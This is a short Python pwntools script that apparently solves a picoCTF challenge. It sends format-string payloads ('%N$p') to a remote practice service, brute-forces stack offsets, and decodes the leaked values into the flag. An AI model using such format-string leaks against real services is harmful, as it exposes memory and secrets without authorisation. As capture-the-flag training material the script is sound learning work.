#!/usr/bin/env python3

from pwn import *

def conn():
    r = remote("mercury.picoctf.net", 59616)
    return r


def main():

    '''
    Search for correct offset that dumps flag
    '''
    ''' UNCOMMENT TO PERFORM THE BRUTE-FORCING
    for i in range(6, 100): 
        r = conn()

        # Send format-string payload
        r.sendlineafter(b'folio\n', b'1\n')
        r.sendlineafter(b'token?\n', b'%'+str(i).encode()+b'$p')
        
        # Discard line
        r.recvline()

        recv = r.recvline()

        if recv != b'(nil)\n': 
            recv = bytes.fromhex(recv.strip()[2:].decode().rjust(8, '0'))[::-1]
        
        print(f"Offset: {i}, Output: {recv}!")

        r.close()

    '''
    '''
    We want %15$p to %24$p
    '''
    r = conn()

    payload = b''
    for i in range(15, 25):
        payload += b'%'+str(i).encode()+b'$p'

    # Send format-string payload
    r.sendlineafter(b'folio\n', b'1\n')
    r.sendlineafter(b'token?\n', payload)
    
    # Discard line
    r.recvline()

    flag = b''
    recv = r.recvline()
    for substring in recv.split(b'0x')[1:]:
        flag += bytes.fromhex(substring.strip().decode().rjust(8, '0'))[::-1]
    print(flag)

if __name__ == "__main__":
    main()
